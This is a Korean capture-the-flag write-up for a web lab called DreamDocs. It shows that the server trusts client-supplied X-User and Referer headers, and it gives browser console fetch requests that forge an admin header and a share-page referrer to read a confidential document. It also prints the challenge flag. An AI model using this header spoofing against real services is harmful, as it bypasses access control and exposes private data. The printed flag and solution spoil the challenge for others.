# B3 · DreamDocs

### 1. VM에 접속한다

문서 공유 서비스에 접속하고, 개발자 도구(Console)에서 문서 목록을 확인한다.

<img src="assets/dreamdocs-home.webp" width="670" alt="DreamDocs 첫 화면" />

### 2. 코드 분석

**① 관리자 권한을 요청 헤더로 판단한다.** 실제 로그인 검증 없이 클라이언트가 보낸 `X-User` 값을 사용한다.

```python
user_level = request.headers.get('X-User', 'guest')

# (생략: /api/docs)
elif doc['classification'] == 'confidential' and user_level == 'admin':
    visible_docs.append({'id': doc_id, 'title': doc['title'], 'classification': doc['classification']})
```

**② 문서 접근도 헤더 문자열만 확인한다.** `Referer`에 `/share`가 포함되고, 기밀 문서에 대해 `X-User: admin`이면 접근을 허용한다.

```python
referer = request.headers.get('Referer', '')
user_level = request.headers.get('X-User', 'guest')

# (생략)
if '/share' not in referer:
    return render_template('error.html', message="Access denied. Documents can only be accessed from the share page."), 403

if document['classification'] == 'confidential':
    if user_level != 'admin':
        return render_template('error.html', message="Insufficient privileges. Administrator access required."), 403

# (생략)
return render_template('document.html', doc=document, doc_id=doc_id)
```

FLAG는 처음 생성한 `confidential` 문서의 `content`에 저장되며, 해당 문서의 ID는 `100~999`에서 랜덤으로 정해진다. **헤더를 조작하면 기밀 문서의 ID와 내용 모두 조회할 수 있다는 점**이 취약점이다.

### 3. 콘솔에서 기밀 문서 ID 확인

```javascript
const docs = await (await fetch('/api/docs', {
    headers: { 'X-User': 'admin' }
})).json();
console.log(docs);
```

<img src="assets/dreamdocs-list.webp" width="820" alt="관리자 헤더로 문서 목록을 요청하고 기밀 문서 ID를 확인한 콘솔 결과" />

`/api/docs`의 관리자 조건을 통과하여 `confidential` 문서가 목록에 포함된다. **조회된 문서 ID는 `856`**이었다. (서버가 재시작되면 달라질 수 있음)

### 4. 문서 요청 후 FLAG 확인

```javascript
fetch('/doc/856', {
    headers: { 'X-User': 'admin' },
    referrer: location.origin + '/share'
})
.then(res => res.text())
.then(html => console.log(html));
```

<img src="assets/dreamdocs-result.webp" width="820" alt="Referer와 관리자 헤더로 기밀 문서를 조회하고 HTML에서 FLAG를 확인한 콘솔 결과" />

`X-User: admin`으로 권한 검사를 통과하고, `referrer`에 `/share`가 포함되어 접근 제한도 통과한다. 응답 HTML의 문서 내용에서 FLAG를 확인하였다.

**FLAG:** `DH{17dda847500b779845306c8d0f16959b}`

> **핵심 취약점:** 서버가 조작 가능한 `X-User`, `Referer` 헤더를 신뢰하여 기밀 문서 접근 권한을 결정한다.